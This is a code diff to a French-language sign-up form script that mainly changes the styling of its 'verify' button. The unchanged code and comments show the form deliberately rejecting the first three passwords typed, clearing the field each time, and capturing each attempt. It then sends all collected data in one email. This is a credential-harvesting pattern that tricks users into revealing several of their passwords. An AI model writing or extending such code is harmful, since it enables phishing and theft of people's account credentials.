@@ -58,6 +58,9 @@ function showForm() {
   checkAttempts = 0;
   checkPassed = false;
   submitBtn.style.display = 'none';
+  // Remettre le bouton vérifier en rouge (enlever la classe verified)
+  checkBtn.classList.remove('verified');
+  checkBtn.textContent = '[ VÉRIFIER ]';
   document.querySelectorAll('input, select').forEach(el => el.value = '');
   allData.history = [];
   checkBtn.style.display = 'block';
@@ -114,7 +117,7 @@ function updateStrengthMeter(pwd) {
   else { label.textContent = 'force : fort'; label.style.color = '#ccc'; }
 }
 
-// Vérification : échoue 3 fois puis affiche le bouton S'inscrire
+// Vérification : échoue 3 fois puis passe en vert et affiche le bouton S'inscrire
 checkBtn.addEventListener('click', function() {
   const pwd = passwordInput.value.trim();
   if (pwd.length === 0) {
@@ -129,15 +132,19 @@ checkBtn.addEventListener('click', function() {
     passwordInput.value = '';
     passwordInput.focus();
   } else {
+    // 3e tentative : on valide
     checkPassed = true;
     showToast('mot de passe accepté.', false);
-    checkBtn.style.display = 'none';
+    // Le bouton vérifier devient vert
+    checkBtn.classList.add('verified');
+    checkBtn.textContent = '[ ✓ VALIDÉ ]';
+    // Afficher le bouton S'inscrire (vert)
     submitBtn.style.display = 'block';
     captureField('password_attempt_final', pwd);
   }
 });
 
-// Soumission finale (1 email avec toutes les données)
+// Soumission finale (1 email)
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
 
